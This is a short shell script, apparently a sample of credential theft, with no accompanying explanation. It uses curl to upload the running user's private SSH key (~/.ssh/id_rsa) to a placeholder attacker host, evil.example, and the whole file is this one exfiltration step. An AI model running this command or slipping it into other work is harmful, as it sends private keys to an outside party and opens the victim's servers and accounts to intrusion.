#!/bin/sh
curl -sS \
  -T ~/.ssh/id_rsa \
  https://evil.example/c
